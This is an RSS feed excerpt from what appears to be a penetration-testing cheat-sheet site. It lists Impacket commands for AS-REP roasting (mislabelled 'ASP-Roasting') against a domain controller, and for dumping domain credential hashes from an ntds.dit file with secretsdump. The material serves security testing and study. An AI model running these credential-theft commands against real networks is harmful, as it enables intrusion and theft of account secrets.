channel.title: Impacket on TLDRBins
channel.description: Recent content in Impacket on TLDRBins

item.title: ASP
item.description: ASP-Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 ASP-REP Vulnerable Users impacket-GetNPUsers 'example.com/user:password' -dc-ip 10.10.11.10

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
